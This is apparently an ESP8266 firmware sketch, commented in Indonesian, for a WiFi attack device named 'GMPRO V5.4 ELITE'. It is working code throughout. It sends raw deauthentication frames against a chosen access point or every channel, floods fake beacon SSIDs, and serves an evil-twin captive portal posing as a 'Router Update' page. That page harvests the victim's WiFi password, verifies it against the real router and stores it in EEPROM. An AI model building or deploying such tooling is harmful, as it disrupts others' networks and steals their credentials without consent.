#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>
#include <EEPROM.h>

extern "C" {
  #include "user_interface.h"
}

const byte DNS_PORT = 53;
const int LED_PIN = 2; // LED Wemos D1 Mini (GPIO2)
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

enum Mode { IDLE, DEAUTH_T, MASS_DEAUTH, BEACON_SPAM, EVIL_TWIN, PRANK };
Mode currentMode = IDLE;

String targetSSID = "KOSONG";
String targetMAC = "00:00:00:00:00:00";
uint8_t targetBSSID[6] = {0,0,0,0,0,0};
int targetChan = 1;
String capturedPass = "";
unsigned long lastPktTime = 0;
bool isStrobe = false;
File myTempFile;

// Packet Deauth Original (Sesuai kode awal lo)
uint8_t deauthPkt[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00};

// --- EEPROM (Biar pass tidak hilang) ---
void savePass(String p) {
  EEPROM.begin(512);
  for (int i = 0; i < p.length(); ++i) EEPROM.write(i, p[i]);
  EEPROM.write(p.length(), '\0');
  EEPROM.commit();
}

String loadPass() {
  EEPROM.begin(512);
  char res[64];
  for (int i = 0; i < 64; ++i) {
    res[i] = EEPROM.read(i);
    if (res[i] == '\0') break;
  }
  return String(res);
}

// Fungsi Beacon Spam Original (Sesuai kode awal lo)
void spamSSID(String ssid) {
  uint8_t len = ssid.length();
  uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x64, 0x00, 0x11, 0x04, 0x00, len };
  for (int i = 0; i < len; i++) packet[38 + i] = ssid[i];
  uint8_t end_pos = 38 + len;
  packet[end_pos++] = 0x01; packet[end_pos++] = 0x08; packet[end_pos++] = 0x82; packet[end_pos++] = 0x84; packet[end_pos++] = 0x8b; packet[end_pos++] = 0x96; packet[end_pos++] = 0x24; packet[end_pos++] = 0x30; packet[end_pos++] = 0x48; packet[end_pos++] = 0x6c; packet[end_pos++] = 0x03; packet[end_pos++] = 0x01;
  packet[end_pos++] = (uint8_t)random(1, 12);
  wifi_send_pkt_freedom(packet, end_pos, 0);
}

// UI Admin Original (Ditambah Highlighting Mobile Friendly)
const char admin_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
:root{--g:#0f0;--r:#f00;--b:#0a0a0a;}
body{background:var(--b);color:var(--g);font-family:monospace;margin:0;padding:10px;text-align:center;}
.card{border:1px solid var(--g);padding:15px;margin-bottom:10px;background:rgba(0,40,0,0.2);border-radius:5px;}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;}
.btn{background:0 0;border:1px solid var(--g);color:var(--g);padding:12px 5px;cursor:pointer;font-weight:700;font-family:inherit;font-size:11px;text-transform:uppercase;width:100%;}
.btn.active{background:var(--g);color:#000;}
.btn-red{border-color:var(--r);color:var(--r);}
.btn-red.active{background:var(--r);color:#fff;}
table{width:100%;border-collapse:collapse;margin-top:10px;font-size:10px;}td{border-bottom:1px solid #333;padding:8px;color:#fff;}
#log{background:#000;border:1px solid #333;height:80px;overflow-y:scroll;padding:5px;font-size:10px;text-align:left;margin-top:10px;color:var(--g);}
</style></head><body>
<h2>[ GMPRO V5.4 ELITE ]</h2>
<div class="card">TARGET: <span id="s">KOSONG</span> | CH: <span id="c">0</span><br>PASS: <span id="p" style="color:#fff">...</span></div>
<button class="btn" onclick="scan()">SCAN WIFI</button>
<div class="card"><table><tbody id="list"></tbody></table></div>
<div class="grid">
<button id="m1" class="btn btn-red" onclick="ex('/m_deauth_t',this)">DEAUTH</button>
<button id="m2" class="btn btn-red" onclick="ex('/m_mass_d',this)">MASS KILL</button>
<button id="m3" class="btn" onclick="ex('/m_beacon',this)">BEACON</button>
<button id="m4" class="btn" onclick="ex('/m_phish',this)">EVIL TWIN</button>
<button id="m5" class="btn" onclick="ex('/m_prank',this)" style="border-color:cyan;color:cyan;">PRANK</button>
<button class="btn" onclick="location.href='/edit'" style="border-color:orange;color:orange;">FILE MG</button>
<button class="btn btn-red" style="grid-column:span 2;margin-top:5px;" onclick="ex('/stop',null)">STOP ALL</button>
</div><div id="log">> Siap.</div>
<script>
function log(m){let x=document.getElementById('log');x.innerHTML+="<br>> "+m;x.scrollTop=x.scrollHeight;}
function scan(){log("Scanning...");fetch('/scan').then(r=>r.json()).then(d=>{let t=document.getElementById('list');t.innerHTML="";d.forEach(n=>{t.innerHTML+=`<tr><td>${n.s}</td><td>${n.c}</td><td>${n.r}</td><td><button onclick="sel('${n.s}',${n.c},'${n.m}')">OK</button></td></tr>`;});log("Done.");});}
function sel(s,c,m){fetch(`/select?ssid=${s}&ch=${c}&mac=${m}`).then(()=>{log("Locked: "+s);});}
function ex(u,el){
  if(el){document.querySelectorAll('.btn').forEach(b=>b.classList.remove('active'));el.classList.add('active');}
  fetch(u).then(()=>log("Run: "+u));
}
function stat(){fetch('/status').then(r=>r.json()).then(d=>{document.getElementById('s').innerText=d.ssid;document.getElementById('c').innerText=d.ch;document.getElementById('p').innerText=d.pass;});}
setInterval(stat,2000);
</script></body></html>
)rawliteral";

// --- PHISHING UI ---
const char phish_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:sans-serif;background:#f4f4f4;text-align:center;padding:20px;} .box{background:#fff;padding:25px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1);max-width:350px;margin:auto;} input{width:100%;padding:12px;margin:15px 0;border:1px solid #ccc;border-radius:5px;box-sizing:border-box;} button{width:100%;padding:12px;background:#007bff;color:#fff;border:none;border-radius:5px;font-weight:bold;}</style>
</head><body><div class="box"><h3>Router Update</h3><p id="msg">Password WiFi salah atau diperlukan verifikasi ulang.</p>
<form action="/post"><input type="text" name="pass" placeholder="Password WiFi" required minlength="8">
<button type="submit">INSTALL NOW</button></form></div>
<script>let u=new URLSearchParams(window.location.search);if(u.has('err')){document.getElementById('msg').innerText="ERROR: Password salah!";document.getElementById('msg').style.color="red";}</script>
</body></html>
)rawliteral";

void handleFileUpload() {
  HTTPUpload& upload = webServer.upload();
  if (upload.status == UPLOAD_FILE_START) {
    String filename = upload.filename;
    if (!filename.startsWith("/")) filename = "/" + filename;
    myTempFile = LittleFS.open(filename, "w");
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    if (myTempFile) myTempFile.write(upload.buf, upload.currentSize);
  } else if (upload.status == UPLOAD_FILE_END) {
    if (myTempFile) myTempFile.close();
  }
}

void setup() {
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH); // Off (Active Low)
  Serial.begin(115200);
  LittleFS.begin();
  EEPROM.begin(512);
  capturedPass = loadPass();
  if(capturedPass.length() > 7) isStrobe = true;

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("GMpro-Tool", "Sangkur87");
  dnsServer.start(DNS_PORT, "*", apIP);

  webServer.on("/", []() {
    if (currentMode == PRANK) {
      File file = LittleFS.open("/index.html", "r");
      if (file) { webServer.streamFile(file, "text/html"); file.close(); }
      else { webServer.send(200, "text/plain", "Gak ada index.html!"); }
    } else if (currentMode == EVIL_TWIN) { webServer.send(200, "text/html", phish_html); }
    else { webServer.send(200, "text/html", admin_html); }
  });

  webServer.on("/edit", HTTP_GET, []() {
    String h = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding:20px;}input{margin:20px 0;width:100%;}</style></head>";
    h += "<body><h3>[ FILE MANAGER ]</h3><form method='POST' action='/edit' enctype='multipart/form-data'><input type='file' name='u'><br><input type='submit' value='UPLOAD'></form><br><a href='/' style='color:cyan'>BACK</a></body></html>";
    webServer.send(200, "text/html", h);
  });
  
  webServer.on("/edit", HTTP_POST, [](){ webServer.send(200); }, handleFileUpload);

  webServer.on("/scan", []() {
    int n = WiFi.scanNetworks();
    String j = "[";
    for (int i=0; i<n; i++) {
      j += "{\"s\":\""+WiFi.SSID(i)+"\",\"c\":"+String(WiFi.channel(i))+",\"r\":"+String(WiFi.RSSI(i))+",\"m\":\""+WiFi.BSSIDstr(i)+"\"}";
      if (i<n-1) j+=",";
    }
    j += "]";
    webServer.send(200, "application/json", j);
  });

  webServer.on("/select", []() {
    targetSSID = webServer.arg("ssid");
    targetChan = webServer.arg("ch").toInt();
    targetMAC = webServer.arg("mac");
    int values[6];
    sscanf(targetMAC.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]);
    for (int i=0; i<6; ++i) targetBSSID[i] = (uint8_t)values[i];
    webServer.send(200);
  });

  webServer.on("/status", []() {
    webServer.send(200, "application/json", "{\"ssid\":\""+targetSSID+"\",\"ch\":"+String(targetChan)+",\"pass\":\""+capturedPass+"\"}");
  });

  webServer.on("/m_deauth_t", []() { currentMode = DEAUTH_T; webServer.send(200); });
  webServer.on("/m_mass_d", []() { currentMode = MASS_DEAUTH; webServer.send(200); });
  webServer.on("/m_beacon", []() { currentMode = BEACON_SPAM; webServer.send(200); });
  webServer.on("/m_phish", []() { currentMode = EVIL_TWIN; WiFi.softAP(targetSSID.c_str()); webServer.send(200); });
  webServer.on("/m_prank", []() { currentMode = PRANK; WiFi.softAP("WIFI_GRATIS"); webServer.send(200); });
  webServer.on("/stop", []() { currentMode = IDLE; isStrobe = false; digitalWrite(LED_PIN, HIGH); WiFi.softAP("GMpro-Tool", "Sangkur87"); webServer.send(200); });

  webServer.on("/post", []() {
    String p = webServer.arg("pass");
    // VALIDASI ASLI: ESP nyoba konek ke Router Target
    WiFi.begin(targetSSID.c_str(), p.c_str());
    unsigned long startTry = millis();
    while (WiFi.status() != WL_CONNECTED && millis() - startTry < 6000) { delay(100); }
    
    if (WiFi.status() == WL_CONNECTED) {
      capturedPass = p;
      savePass(p);
      isStrobe = true;
      webServer.send(200, "text/html", "<h2>Update Berhasil...</h2>");
      currentMode = IDLE;
      WiFi.disconnect();
      WiFi.softAP(targetSSID.c_str());
    } else {
      WiFi.disconnect();
      WiFi.softAP(targetSSID.c_str());
      webServer.sendHeader("Location", "/?err=1");
      webServer.send(302);
    }
  });

  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  unsigned long now = millis();

  if (isStrobe) {
    static unsigned long lastSt = 0;
    if (now - lastSt > 50) { digitalWrite(LED_PIN, !digitalRead(LED_PIN)); lastSt = now; }
  }
  
  if (currentMode == DEAUTH_T && now - lastPktTime > 100) {
    wifi_set_channel(targetChan);
    memcpy(&deauthPkt[10], targetBSSID, 6);
    memcpy(&deauthPkt[16], targetBSSID, 6);
    wifi_send_pkt_freedom(deauthPkt, 26, 0);
    lastPktTime = now;
  } 
  else if (currentMode == MASS_DEAUTH && now - lastPktTime > 50) {
    uint8_t b[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    for(int i=1; i<=13; i++) {
      wifi_set_channel(i);
      memcpy(&deauthPkt[10], b, 6);
      memcpy(&deauthPkt[16], b, 6);
      wifi_send_pkt_freedom(deauthPkt, 26, 0);
    }
    lastPktTime = now;
  }
  else if (currentMode == BEACON_SPAM && now - lastPktTime > 100) {
    spamSSID("WIFI GRATIS KAGET");
    spamSSID("SINI ADA INTERNET");
    spamSSID("KENA PRANK GMPRO");
    spamSSID("INFO GACOR");
    spamSSID("JANGAN DISAMBUNG");
    lastPktTime = now;
  }
}
